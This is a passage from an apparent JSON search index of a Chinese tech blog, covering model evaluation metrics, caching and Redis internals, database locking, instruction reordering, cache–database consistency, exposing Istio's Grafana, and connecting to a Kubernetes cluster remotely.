Curve）的值为ROC曲线下面的面积，若分类器的性能极好，则AUC为1。但现实生活中尤其是工业界不会有如此完美的模型，一般AUC均在0.5到1之间，AUC越高，模型的区分能力越好，上图AUC为0.81。若AUC=0.5，即与上图中红线重合，表示模型的区分能力与随机猜测没有差别。若AUC真的小于0.5，请检查一下是不是好坏标签标反了，或者是模型真的很差。\n怎么选择评估指标？ 这种问题的答案当然是具体问题具体分析啦，单纯地回答谁好谁坏是没有意义的，我们需要结合实际场景给出合适的回答。\n考虑下面是两个场景，由此看出不同场景下我们关注的点是不一样的：\n 对于地震的预测，我们希望的是Recall非常高，也就是说每次地震我们都希望预测出来。这个时候我们可以牺牲Precision。情愿发出1000次警报，把10次地震都预测正确了；也不要预测100次对了8次漏了两次。所以我们可以设定在合理的precision下，最高的recall作为最优点，找到这个对应的threshold点。 嫌疑人定罪基于不错怪一个好人的原则，对于嫌疑人的定罪我们希望是非常准确的。即使有时候放过了一些罪犯（Recall低），但也是值得的。  ROC和PRC在模型性能评估上效果都差不多，但需要注意的是，在正负样本分布得极不均匀(highly skewed datasets)的情况下，PRC比ROC能更有效地反应分类器的好坏。在数据极度不平衡的情况下，譬如说1万封邮件中只有1封垃圾邮件，那么如果我挑出10封，50封，100\u0026hellip;封垃圾邮件（假设我们每次挑出的N封邮件中都包含真正的那封垃圾邮件），Recall都是100%，但是FPR分别是9/9999, 49/9999, 99/9999（数据都比较好看：FPR越低越好），而Precision却只有1/10，1/50， 1/100 （数据很差：Precision越高越好）。所以在数据非常不均衡的情况下，看ROC的AUC可能是看不出太多好坏的，而PR curve就要敏感的多。\nIOU 上面讨论的是分类任务中的评价指标，这里想简单讲讲目标检测任务中常用的评价指标：IOU（Intersection over Union），中文翻译为交并比。\n这里是一个实际例子：下图绿色框是真实感兴趣区域，红色框是预测区域，这种情况下交集确实是最大的，但是红色框并不能准确预测物体位置。因为预测区域总是试图覆盖目标物体而不是正好预测物体位置。这时如果我们能除以一个并集的大小，就可以规避这种问题。这就是IOU要解决的问题了。\n下图表示了IOU的具体意义，即：预测框与标注框的交集与并集之比，数值越大表示该检测器的性能越好。\n使用IOU评价指标后，上面提到的问题一下子解决了：我们控制并集不要让并集太大，对准确预测是有益的，这就有效抑制了“一味地追求交集最大”的情况的发生。下图的2,3小图就是目标检测效果比较好的情况。\n参考 【深度学习】常用的模型评估指标 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/ai/%E5%B8%B8%E7%94%A8%E7%9A%84%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E6%8C%87%E6%A0%87/","series":["Manual"],"tags":["CNN","AI"],"title":"常用的模型评估指标"},{"categories":["计算机科学"],"content":"常见类型包括LFU、LRU、ARC、FIFO、MRU。\n 最不经常使用算法（LFU, Least Frequently Used）：  这个缓存算法使用一个计数器来记录条目被访问的频率。通过使用LFU缓存算法，最低访问数的条目首先被移除。这个方法并不经常使用，因为它无法对一个拥有最初高访问率之后长时间没有被访问的条目缓存负责。\n 最近最少使用算法（LRU, Least Recently Used）  LRU是首先淘汰最长时间未被使用的页面。这种算法把近期最久没有被访问过的页面作为被替换的页面。它把LFU算法中要记录数量上的\u0026quot;多\u0026quot;与\u0026quot;少\u0026quot;简化成判断\u0026quot;有\u0026quot;与\u0026quot;无\u0026quot;，因此，实现起来比较容易。\n注意：LRU的淘汰规则是基于访问时间，而LFU是基于访问次数的 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/cs/other/%E5%B8%B8%E7%94%A8%E7%BC%93%E5%AD%98%E6%B7%98%E6%B1%B0%E7%AE%97%E6%B3%95/","series":["Manual"],"tags":["CS"],"title":"常用缓存淘汰算法"},{"categories":["编程思想"],"content":"字符串: SDS\nlist: 元素少且小 👉🏿 ziplist , 元素多且大 👉🏿 双链表\nhash: 元素少且小 👉🏿 ziplist , 元素多且大 👉🏿 hashtable\nzset: 元素少且小 👉🏿 ziplist , 元素多且大 👉🏿 skiplist\nset: 元素少且小 👉🏿 intset , 元素多且大 👉🏿 hashtable\n redis的hashtable使用拉链法解决冲突\n 什么是跳跃表？\n跳表是一种带多级索引的链表。\n有序链表能以log(n)的时间复杂实现查找，但是空间复杂度是O(n)，也就是说，如果将包含 n 个结点的单链表构造成跳表，我们需要额外再用接近 n 个结点的存储空间。\n答：跳表这种高效的数据结构，值得每一个程序员掌握 为什么使用压缩ziplist？\n答：相较于双链表，节省了两个指针的空间。（pre_entry_length前驱数据项的大小。因为不用描述前驱的数据类型，描述较为简单）。相较于数组，ziplist的每个entry所占的内存大小可以不同，便于节省空间。\n为什么list  hash  zset 在数据量大的时候不再使用ziplist？\n答：难以获得大的连续的内存空间。\n参考 图解redis五种数据结构底层实现(动图哦) Redis 数据结构 ziplist Redis源码分析-压缩列表ziplist ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/redis/%E5%BA%95%E5%B1%82%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/","series":["Manual"],"tags":["Redis"],"title":"底层数据结构"},{"categories":["编程思想"],"content":"悲观锁 共享锁、排他锁\n 共享锁，也就是其他事务可以并发读（其他事务也需要加共享锁），但是不能写。\n排它锁，其他事务不能并发写也不能并发读。\n 乐观锁 乐观锁其实也不是实际的锁，甚至没有用到锁来实现并发控制，而是采取其他方式来判断能否修改数据。乐观锁一般是用户自己实现的一种锁机制，虽然没有用到实际的锁，但是能产生加锁的效果。\n乐观锁基本都是基于 CAS（Compare and swap）算法来实现的。\n主要有以下几种方式：\n 版本号标记：在表中新增一个字段：version，用于保存版本号。获取数据的时候同时获取版本号，然后更新数据的时候用以下命令:update xxx set version=version+1,… where … version=\u0026quot;old version\u0026quot; and ....。这时候通过判断返回结果的影响行数是否为0来判断是否更新成功，更新失败则说明有其他请求已经更新了数据了。 时间戳标记：和版本号一样，只是通过时间戳来判断。一般来说很多数据表都会有更新时间这一个字段，通过这个字段来判断就不用再新增一个字段了。 待更新字段：如果没有时间戳字段，而且不想新增字段，那可以考虑用待更新字段来判断，因为更新数据一般都会发生变化，那更新前可以拿要更新的字段的旧值和数据库的现值进行比对，没有变化则更新。 所有字段标记：数据表所有字段都用来判断。这种相当于就、不仅仅对某几个字段做加锁了，而是对整个数据行加锁，只要本行数据发生变化，就不进行更新。  总结 悲观锁和乐观锁大部分场景下差异不大，一些独特场景下有一些差别，一般我们可以从如下几个方面来判断：\n1.响应速度：如果需要非常高的响应速度，建议采用乐观锁方案，成功就执行，不成功就失败，不需要等待其他并发去释放锁\n2.冲突频率：如果冲突频率非常高，建议采用悲观锁，保证成功率，如果冲突频率大，乐观锁会需要多次重试才能成功，代价比较大\n3.重试代价：如果重试代价大，建议采用悲观锁\n参考链接： 乐观锁与悲观锁各自适用场景是什么？ 一文读懂数据库中的乐观锁和悲观锁和MVCC ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/mysql/%E6%82%B2%E8%A7%82%E9%94%81%E5%92%8C%E4%B9%90%E8%A7%82%E9%94%81/","series":["Manual"],"tags":["MySQL"],"title":"悲观锁和乐观锁"},{"categories":["计算机科学"],"content":"我们知道java在运行的时候有两个地方可能用到重排序，一个是编译器编译的的时候，一个是处理器运行的时候。\n那么我们就应该问问为啥要用指令重排序呢？\n编译期重排序有啥好处？\nCPU计算的时候要访问值，如果常常利用到寄存器中已有的值就不用去内存读取了，比如说\nint a = 1; int b = 1; a = a + 1; b = b +1 ; 就可能没有\nint a = 1; a = a + 1; int b = 1; b = b +1 ; 性能好，因为后者的a或b可能在寄存器中了。\n处理器为啥要重排序？\n一条汇编指令的执行步骤：\n  取指 IF 译码和取寄存器操作 ID 执行或者有效地址计算 EX 存储器访问 MEM 写回 WB   在CPU工作中汇编指令分多步完成，每一部涉及到的硬件（寄存器）可能不同，于是有了流水线技术来执行指令。\n没有流水线技术前，如果同时两个指令过来执行 一个需要5秒，那么两个就需要10秒；有了流水线技术之后，可能就只要6秒。多个指令同时执行时性能显著提升。\n 流水线技术是一种将指令分解为多步，并让不同指令的各步操作重叠，从而实现几条指令并行处理。\n指令1 IF ID EX MEN WB\n指令2 IF ID EX MEN WB\n指令的每一步都由不同的硬件完成，假设每一步耗时1ms,执行完一条指令需耗时5ms,\n每条指令都按顺序执行，那两条指令则需10ms。\n但是通过流水线在指令1刚执行完IF，执行IF的硬件立马就开始执行指令2的IF，这样指令2只需要等1ms,两个指令执行完只需要6ms,效率是不是提升巨大！\n 这个和指令重排有啥关系？\n流水线技术并不是说多个汇编指令都能并行执行，还是需要等他其他指令执行完才可以执行（比如ADD指令需要等待LW指令读取寄存器数据完成），那么在这个等待过程中，我们可以让和这个指令不相干的后面的指令先执行（比如另外一个表达式的LW指令），这就是指令重排。\n先记住几个指令：\n LW(加载数据到寄存器的指令)\nADD(两个定点寄存器的内容相加)\nSUB(相减)\nSW(把数据从寄存器存储到存储器)\n 现在来看一下代码 A=B+C 是怎么执行的\n现有R1,R2,R3三个寄存器, LW R1,B IF ID EX MEN WB（加载B到R1中） LW R2,C IF ID EX MEN WB（加载C到R2中） ADD R3,R2,R1 IF ID × EX MEN WB（R1,R2相加放到R3） SW A,R3 IF ID x EX MEN WB（把R3 的值保存到变量A） 在ADD指令执行中有个x，表示中断、停顿，ADD为什么要在这里停顿一下呢？因为这时C还没加载到R2中，只能等待，而这个等待使得后边的所有指令都会停顿一下。 这个停顿可以避免吗？\n当然是可以的，通过指令重排就可以实现，再看一下下面的例子：\n要执行\nA=B+C;\nD=E-F;\n通过将D=E-F执行的指令顺序提前，从而消除因等待加载完毕的时间。 LW Rb,B IF ID EX MEN WB LW Rc,C IF ID EX MEN WB LW Re,E IF ID EX MEN WB ADD Ra,Rb,Rc IF ID EX MEN WB LW Rf,F IF ID EX MEN WB SW A,Ra IF ID EX MEN WB SUB Rd,Re,Rf IF ID EX MEN WB SW D,Rd IF ID EX MEN WB 与其让第一个表达式的ADD指令阻塞等待，还不如让第二个表达式的LW指令先执行，注意两个表达式的LW指令操作的是不同的寄存器，所以可以并行执行。\n我们写一段代码来试试：\npackage *****; /** * reorder * @author Mageek Chiu * @date 2018/5/25 0025:12:49 */ public class ReOrder { public int value ; private ReOrder(int value) { this.value = value; } public static void main(String... args){ ReOrder reOrder = new ReOrder(111); ReOrder reOrder1 = new ReOrder(222); ReOrder reOrder2 = new ReOrder(333); System.out.println(add1(reOrder,reOrder1,reOrder2)); } static int add1(ReOrder reOrder,ReOrder reOrder1,ReOrder reOrder2){ int result = 0; result += reOrder.value; result += reOrder1.value; result += reOrder2.value;//***  result += reOrder.value; result += reOrder1.value; result += reOrder2.value; result += reOrder.value; result += reOrder1.value; result += reOrder2.value; return result; } } 运行结果中：\n# {method} {0x000000001c402c80} 'add1' '(*****/ReOrder;*****/ReOrder;*****/ReOrder;)I' in '*****/ReOrder' # parm0: rdx:rdx = '*****/ReOrder' # parm1: r8:r8 = '*****/ReOrder' # parm2: r9:r9 = '*****/ReOrder' # [sp+0x20] (sp of caller) 0x00000000032a86c0: mov dword ptr [rsp+0ffffffffffffa000h],eax 0x00000000032a86c7: push rbp 0x00000000032a86c8: sub rsp,10h ;*synchronization entry ; - *****.ReOrder::add1@-1 (line 24) 0x00000000032a86cc: mov r11d,dword ptr [rdx+0ch] ;*getfield value ; - *****.ReOrder::add1@4 (line 26) ; implicit exception: dispatches to 0x00000000032a86ff 0x00000000032a86d0: mov r10d,dword ptr [r8+0ch] ;*getfield value ; - *****.ReOrder::add1@11 (line 27) ; implicit exception: dispatches to 0x00000000032a870d 0x00000000032a86d4: mov r9d,dword ptr [r9+0ch] ;*getfield value ; - *****.ReOrder::add1@18 (line 28) ; implicit exception: dispatches to 0x00000000032a8719 0x00000000032a86d8: mov eax,r11d 0x00000000032a86db: add eax,r10d 0x00000000032a86de: add eax,r9d 0x00000000032a86e1: add eax,r11d 0x00000000032a86e4: add eax,r10d 0x00000000032a86e7: add eax,r9d 0x00000000032a86ea: add eax,r11d 0x00000000032a86ed: add eax,r10d 0x00000000032a86f0: add eax,r9d ;*iadd 也就是先用mov把方法里面所需要的三个value加载了，再统一用add进行加法运算。\n现在我们把//***哪一行注释掉，运行结果如下：\n[Constants] # {method} {0x000000001c052c78} 'add1' '(*****/ReOrder;*****/ReOrder;*****/ReOrder;)I' in '*****/ReOrder' # parm0: rdx:rdx = '*****/ReOrder' # parm1: r8:r8 = '*****/ReOrder' # parm2: r9:r9 = '*****/ReOrder' # [sp+0x20] (sp of caller) 0x0000000002f47d40: mov dword ptr [rsp+0ffffffffffffa000h],eax 0x0000000002f47d47: push rbp 0x0000000002f47d48: sub rsp,10h ;*synchronization entry ; - *****.ReOrder::add1@-1 (line 24) 0x0000000002f47d4c: mov r11d,dword ptr [rdx+0ch] ;*getfield value ; - *****r.ReOrder::add1@4 (line 26) ; implicit exception: dispatches to 0x0000000002f47d7c 0x0000000002f47d50: mov r10d,dword ptr [r8+0ch] ;*getfield value ; - *****.ReOrder::add1@11 (line 27) ; implicit exception: dispatches to 0x0000000002f47d89 0x0000000002f47d54: mov r9d,dword ptr [r9+0ch] ;*getfield value ; - *****::add1@32 (line 32) ; implicit exception: dispatches to 0x0000000002f47d95 0x0000000002f47d58: mov eax,r11d 0x0000000002f47d5b: add eax,r10d 0x0000000002f47d5e: add eax,r11d 0x0000000002f47d61: add eax,r10d 0x0000000002f47d64: add eax,r9d 0x0000000002f47d67: add eax,r11d 0x0000000002f47d6a: add eax,r10d 0x0000000002f47d6d: add eax,r9d ;*iadd 依然是先把所有value都用mov指令加载后再进行加法运算。 总结起来就是不管代码里这个值使用顺序多靠后，都先用mov加载后再使用add对这个值进行运算。\n注意，上面的运行参数为-Xcomp -XX:+UnlockDiagnosticVMOptions -XX:CompileCommand=print,*ReOrder.add1 -XX:+PrintCompilation。 Xcomp 含义是使用编译模式而不是解释模式， -XX:CompileCommand=print,*ReOrder.add1表示只打印这个方法，-XX:+PrintCompilation表示打印方法名称。 需要插件hsdis，编译好后放在jdk的jre的bin的server中就好，具体环境搭建可以参阅这里 参考 汇编语言入门教程 为什么要指令重排序？ 编译器为什么要做指令重排呢 计算机指令执行过程详解 Java内存访问重排序的研究 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/cs/other/%E6%8C%87%E4%BB%A4%E9%87%8D%E6%8E%92/","series":["Manual"],"tags":["CS"],"title":"指令重排"},{"categories":["计算机科学"],"content":"数据库与缓存双写可以有4种顺序： 更新缓存-\u0026gt;更新db、更新db-\u0026gt;更新缓存、删除缓存-\u0026gt;更新db、更新db-\u0026gt;删除缓存\n前两种顺序有显著的缺陷：\n 后更新的数据源失败，因为无法将先更新的数据源回滚（redis）或者不知道该不该回滚（超时）导致数据不一致； 多并发（大于两个并发请求，不一定需要高并发）场景下，因为双写不是原子操作，就有可能发生数据不一致； 读少写多的场景下，大量缓存一直在被更新，却没有被读，一直在做无用功。  后两种顺序也存在在多并发数据场景下数据不一致的情形，但是它们都可以通过 异步延迟双删+失败删除重试机制 解决，其中更新db-\u0026gt;删除缓存 发生不一致的概率更低，所以应该首先最后一种顺序实施双写。\n首先，缓存由于其高并发和高性能的特性，已经在项目中被广泛使用。在读取缓存方面，大家没啥疑问，都是按照下图的流程来进行业务操作。\n、\n双写可分为：更新缓存-\u0026gt;更新db、更新db-\u0026gt;更新缓存、删除缓存-\u0026gt;更新db、更新db-\u0026gt;删除缓存 四种策略。\n并发事务时，前两种策略不仅存在数据不一致的，而且在写多读少的场景下会白白消耗缓存的性能（因为数据还没被读就又被更新了，尤其是在更新的缓存需要通过复杂计算才能得到时，这种消耗更加严重）。后两种策略情况相似，只是更新db-\u0026gt;删除缓存相较于删除缓存-\u0026gt;更新db发生数据不一致的概率更低（因为只有在写操作先于读操作完成才会不一致，而一般来说一个写操作是要比读操作慢的），为防止不一致发生，它们都采用异步延迟双删+删除重试机制的策略，下面详述常见删除重试机制。\n重试机制：方案一 流程如下所示 （1）更新数据库数据； （2）缓存因为种种问题删除失败 （3）将需要删除的key发送至消息队列 （4）自己消费消息，获得需要删除的key （5）继续重试删除操作，直到成功 然而，该方案有一个缺点，对业务线代码造成大量的侵入。于是有了方案二，在方案二中，启动一个订阅程序去订阅数据库的binlog，获得需要操作的数据。在应用程序中，另起一段程序，获得这个订阅程序传来的信息，进行删除缓存操作。\n重试机制：方案二 流程如下图所示： （1）更新数据库数据 （2）数据库会将操作信息写入binlog日志当中 （3）订阅程序提取出所需要的数据以及key （4）另起一段非业务代码，获得该信息 （5）尝试删除缓存操作，发现删除失败 （6）将这些信息发送至消息队列 （7）重新从消息队列中获得该数据，重试操作。\n上述的订阅binlog程序在mysql中有现成的中间件叫canal，可以完成订阅binlog日志的功能。至于oracle中，博主目前不知道有没有现成中间件可以使用。另外，重试机制，博主是采用的是消息队列的方式。如果对一致性要求不是很高，直接在程序中另起一个线程，每隔一段时间去重试即可，这些大家可以灵活自由发挥，只是提供一个思路。\n参考链接： 分布式之数据库和缓存双写一致性方案解析 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/cs/distributed/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%92%8C%E7%BC%93%E5%AD%98%E5%8F%8C%E5%86%99%E4%B8%80%E8%87%B4%E6%80%A7/","series":["Manual"],"tags":["分布式","CS"],"title":"数据库和缓存双写一致性"},{"categories":["云原生"],"content":"暴露grafana等内部组件服务\n在安装完成istio后，默认状态下，集群外用户不能直接访问istio集群内的grafana等管理、监控服务。\n有两种方法可以将集群内服务开放出来。一种是使用port-forward方式将本地端口流量转发到pod端口，实现集群内服务的访问；另一种方式是采用istio gateway方式，将集群内服务暴露到外网。\n第一种方式（以暴露Prometheus为例，官方教程 也是这种方式，这种方式极其反人类，推荐使用下面的第二种方式）：\nkubectl -n Istio-system port-forward $(kubectl -n Istio-system get pod -l app=prometheus -o jsonpath=\u0026#39;{.items[0].metadata.name}\u0026#39;) 9090:9090 \u0026amp; 第二种方式需要将集群的默认网关服务ingressgateway的网络模式设置为LB/nodeport模式，作为代理实现对外服务。\n1. 设置ingress gateway的工作模式 安装istio的时候默认就是LB的\n2. 验证ingress gateway的网络模式 [root@k8s-master ~]# kubectl get svc -n Istio-system NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE grafana ClusterIP 10.101.122.19 \u0026lt;none\u0026gt; 3000/TCP 11h Istio-egressgateway ClusterIP 10.106.2.83 \u0026lt;none\u0026gt; 80/TCP,443/TCP,15443/TCP 11h Istio-ingressgateway LoadBalancer 10.110.238.41 \u0026lt;pending\u0026gt; 15020:31598/TCP,80:30299/TCP,443:31413/TCP,15029:30249/TCP,15030:32499/TCP,15031:31399/TCP,15032:32373/TCP,31400:30156/TCP,15443:30319/TCP 11h Istio-pilot ClusterIP 10.103.43.172 \u0026lt;none\u0026gt; 15010/TCP,15011/TCP,15012/TCP,8080/TCP,15014/TCP,443/TCP 11h istiod ClusterIP 10.105.251.21 \u0026lt;none\u0026gt; 15012/TCP,443/TCP 11h jaeger-agent ClusterIP None \u0026lt;none\u0026gt; 5775/UDP,6831/UDP,6832/UDP 11h jaeger-collector ClusterIP 10.99.197.254 \u0026lt;none\u0026gt; 14267/TCP,14268/TCP,14250/TCP 11h jaeger-collector-headless ClusterIP None \u0026lt;none\u0026gt; 14250/TCP 11h jaeger-query ClusterIP 10.110.152.152 \u0026lt;none\u0026gt; 16686/TCP 11h kiali ClusterIP 10.100.252.210 \u0026lt;none\u0026gt; 20001/TCP 11h prometheus ClusterIP 10.108.175.66 \u0026lt;none\u0026gt; 9090/TCP 11h tracing ClusterIP 10.102.204.150 \u0026lt;none\u0026gt; 80/TCP 11h zipkin ClusterIP 10.104.104.190 \u0026lt;none\u0026gt; 9411/TCP 11h 3. 查看作为边界代理的ingress-gateway的端口映射情况 [root@k8s-master ~]# kubectl describe svc Istio-ingressgateway -n Istio-system Name: Istio-ingressgateway Namespace: Istio-system Labels: app=Istio-ingressgateway Istio=ingressgateway operator.Istio.io/component=IngressGateways operator.Istio.io/managed=Reconcile operator.Istio.io/version=1.5.10 release=Istio Annotations: Selector: app=Istio-ingressgateway,Istio=ingressgateway Type: LoadBalancer IP: 10.110.238.41 Port: status-port 15020/TCP TargetPort: 15020/TCP NodePort: status-port 31598/TCP Endpoints: 10.109.131.26:15020 Port: http2 80/TCP TargetPort: 80/TCP NodePort: http2 30299/TCP Endpoints: 10.109.131.26:80 Port: https 443/TCP TargetPort: 443/TCP NodePort: https 31413/TCP Endpoints: 10.109.131.26:443 Port: kiali 15029/TCP TargetPort: 15029/TCP NodePort: kiali 30249/TCP Endpoints: 10.109.131.26:15029 Port: prometheus 15030/TCP TargetPort: 15030/TCP NodePort: prometheus 32499/TCP Endpoints: 10.109.131.26:15030 Port: grafana 15031/TCP TargetPort: 15031/TCP NodePort: grafana 31399/TCP Endpoints: 10.109.131.26:15031 Port: tracing 15032/TCP TargetPort: 15032/TCP NodePort: tracing 32373/TCP Endpoints: 10.109.131.26:15032 Port: tcp 31400/TCP TargetPort: 31400/TCP NodePort: tcp 30156/TCP Endpoints: 10.109.131.26:31400 Port: tls 15443/TCP TargetPort: 15443/TCP NodePort: tls 30319/TCP Endpoints: 10.109.131.26:15443 Session Affinity: None External Traffic Policy: Cluster Events: \u0026lt;none\u0026gt; 上图所示，ingressgateway创建时，自动预设了一些端口映射，其中https-grafana的15301端口映射到node的31399端口,我们将15031端口关联到grafana上，集群外就用户通过访问网关所在机器的31399端口访问到grafana服务。\n4. gateway方式暴露集群内服务 需要创建服务的gateway和virtual service资源如下：\napiVersion: networking.istio.io/v1alpha3 kind: Gateway metadata: name: grafana-gateway spec: selector: istio: ingressgateway # use istio default controller servers: - port: number: 15031 name: http protocol: HTTP hosts: - \u0026#34;*\u0026#34; --- apiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: grafana-vs spec: hosts: - \u0026#34;*\u0026#34; gateways: - grafana-gateway http: - route: - destination: host: grafana port: number: 3000 执行：\nkubectl apply -f grafana-gateway.yaml -n Istio-system 特别需要注意：后面的namespace是istio-system，因为grafana等内部组件都是这个namespace的。\n5. 测试grafana的连通性 http://\u0026lt;公网IP\u0026gt;:31399 参考 istio中的grafana等内部组件服务开放给集群外用户访问 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/istio/istio%E5%AE%9E%E6%88%98/%E6%9A%B4%E9%9C%B2grafana%E7%AD%89%E5%86%85%E9%83%A8%E7%BB%84%E4%BB%B6%E6%9C%8D%E5%8A%A1/","series":["istio实战"],"tags":["云原生","istio"],"title":"暴露grafana等内部组件服务"},{"categories":["计算机科学"],"content":" 使用自定义 TCP 协议进行传输就会避免上面这个问题，极大地减轻了传输数据的开销。 这也就是为什么通常会采用自定义 TCP 协议的 RPC 来进行进行服务调用的真正原因。 除此之外，成熟的 RPC 框架还提供好了“服务自动注册与发现”、\u0026ldquo;智能负载均衡\u0026rdquo;、“可视化的服务治理和运维”、“运行期流量调度”等等功能，这些也算是选择 RPC 进行服务注册和发现的一方面原因吧！  ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/cs/other/%E6%9C%8D%E5%8A%A1%E4%B9%8B%E9%97%B4%E7%9A%84%E8%B0%83%E7%94%A8%E4%B8%BA%E5%95%A5%E4%B8%8D%E7%9B%B4%E6%8E%A5%E7%94%A8-http-%E8%80%8C%E7%94%A8-rpc/","series":["Manual"],"tags":["CS"],"title":"服务之间的调用为啥不直接用 HTTP 而用 RPC？"},{"categories":["云原生"],"content":"服务网格原理\n","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/istio/istio%E5%9F%BA%E7%A1%80/%E6%9C%8D%E5%8A%A1%E7%BD%91%E6%A0%BC%E5%8E%9F%E7%90%86/","series":null,"tags":["云原生","istio"],"title":"服务网格原理"},{"categories":["云原生"],"content":"本地连接k8s集群 在日常开发的过程中，经常会需要在本地开发的程序需要在k8s中调试的场景，比如，写了一个operator。\n如果此时，本地又没有可以直接可达的k8s集群，\n比如k8s是在公有云的vpc环境内，外面无法直接访问。想要本地连接远程k8s集群，可以参考 本地连接远程的内网k8s集群 再比如k8s集群是自己通过多台云服务器自行搭建的，master节点有自己的公网ip。想要本地连接远程k8s集群，可以参考本文。\n1⃣️ 重新生成config文件 默认下，~/.kube/config 生成配置文件的时候只包含了k8s集群ip和这个节点的局域网ip，本地如果想远程操作k8s的话，必定要通过公网ip连接到k8s集群，所以我们需要把节点绑定的公网ip也放到证书里面去，即我们需要重新生成证书。如果不这样做，本地直接访问的话，会报如下提示：\ntony@192 ~ % kubectl get pod Unable to connect to the server: x509: certificate is valid for 10.96.0.1, 172.17.0.14, not 106.55.152.92 先备份证书：\n[root@k8s-master .kube]# mkdir -p /etc/kubernetes/pki.bak [root@k8s-master .kube]# mv /etc/kubernetes/pki/apiserver.* /etc/kubernetes/pki.bak 重新生成证书：\n[root@k8s-master .kube]# kubeadm init phase certs all --apiserver-advertise-address=0.0.0.0 --apiserver-cert-extra-sans=10.96.0.1,172.17.0.14,xxx.xxx.xxx.xxx(公网ip) I0627 15:10:39.069106 7777 version.go:252] remote version is much newer: v1.21.2; falling back to: stable-1.18 W0627 15:10:40.982380 7777 configset.go:202] WARNING: kubeadm cannot validate component configs for API groups [kubelet.config.k8s.io kubeproxy.config.k8s.io] [certs] Using certificateDir folder \u0026#34;/etc/kubernetes/pki\u0026#34; [certs] Using existing ca certificate authority [certs] Generating \u0026#34;apiserver\u0026#34; certificate and key [certs] apiserver serving cert is signed for DNS names [k8s-master kubernetes kubernetes.default kubernetes.default.svc kubernetes.default.svc.cluster.local] and IPs [10.96.0.1 172.17.0.14 10.96.0.1 172.17.0.14 106.55.152.92] [certs] Using existing apiserver-kubelet-client certificate and key on disk [certs] Using existing front-proxy-ca certificate authority [certs] Using existing front-proxy-client certificate and key on disk [certs] Using existing etcd/ca certificate authority [certs] Using existing etcd/server certificate and key on disk [certs] Using existing etcd/peer certificate and key on disk [certs] Using existing etcd/healthcheck-client certificate and key on disk [certs] Using existing apiserver-etcd-client certificate and key on disk [certs] Using the existing \u0026#34;sa\u0026#34; key 重启apiserver:\n[root@k8s-master .kube]# docker rm -f `docker ps -q -f \u0026#39;name=k8s_kube-apiserver*\u0026#39;` cd130929bc7e [root@k8s-master .kube]# systemctl restart kubelet 2⃣️ 修改ip 拷贝master节点的配置文件 ~/.kube/config 到本地 ~/.kube/config ，修改server的ip地址为master节点的公网ip地址\n3⃣️ 本地验证 tony@192 ~ % kubectl get pod NAME READY STATUS RESTARTS AGE ceres-admin-server-deployment-7f9c4c697d-7pphh 2/2 Running 0 92d ceres-admin-web-deployment-7c8fb64f58-ft8xv 2/2 Running 2 192d ceres-app-server-deployment-65b6bb99f9-qlwb2 2/2 Running 0 92d ceres-jobs-server-deployment-bdcd669bb-284k5 2/2 Running 2 217d ceres-merchant-web-deployment-6c6b668b8d-5vtq5 2/2 Running 2 192d ceres-settled-merchant-deployment-5f74c8f46d-f982v 2/2 Running 2 213d details-v1-6c9f8bcbcb-pzkfm 2/2 Running 6 296d nfs-client-provisioner-6965c6967-6jv6c 2/2 Running 8 217d productpage-v1-7f9d9c48c8-kgtlw 2/2 Running 4 296d ratings-v1-65cff55fb8-vmj4z 2/2 Running 6 296d reviews-v1-d5b6b667f-9b7kw 2/2 Running 4 296d reviews-v2-784495d9bc-xvqpw 2/2 Running 6 296d reviews-v3-57fcb844b7-xsj47 2/2 Running 4 296d 参考链接🔗 Invalid x509 certificate for kubernetes master ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/k8s/%E5%AE%9E%E6%88%98/%E6%9C%AC%E5%9C%B0%E8%BF%9E%E6%8E%A5k8s%E9%9B%86%E7%BE%A4/","series":["k8s实战"],"tags":["云原生","k8s"],"title":"本地连接k8s集群"},{"categories":["编程思想"],"content":"找出数组 arr 中重复出现过的元素（不用考虑返回顺序）\n示例1\n输入 [1, 2, 4, 4, 3, 3, 1, 5, 3] 输出 [1, 3, 4] 将传入的数组arr中的每一个元素value当作另外一个新数组b的key，然后遍历arr去访问b[value]，若b[value]不存在，则将b[value]设置为1，若b[value]存在，则将其加1。可以想象，若arr中数组没有重复的元素，则b数组中所有元素均为1；若arr数组中存在重复的元素，则在第二次访问该b[value]时，b[value]会加1，其值就为2了。最后遍历b数组，将其值大于1的元素的key存入另一个数组a中，就得到了arr中重复的元素。\nfunction duplicates(arr) { //声明两个数组，a数组用来存放结果，b数组用来存放arr中每个元素的个数  var a = [],b = []; //遍历arr，如果以arr中元素为下标的的b元素已存在，则该b元素加1，否则设置为1  for(var i = 0; i \u0026lt; arr.length; i++){ if(!b[arr[i]]){ b[arr[i]] = 1; continue; } b[arr[i]]++; } //遍历b数组，将其中元素值大于1的元素下标存入a数组中  for(var i = 0; i \u0026lt; b.length; i++){ if(b[i] \u0026gt; 1){ a.push(i); } } return a; } 查找重复元素 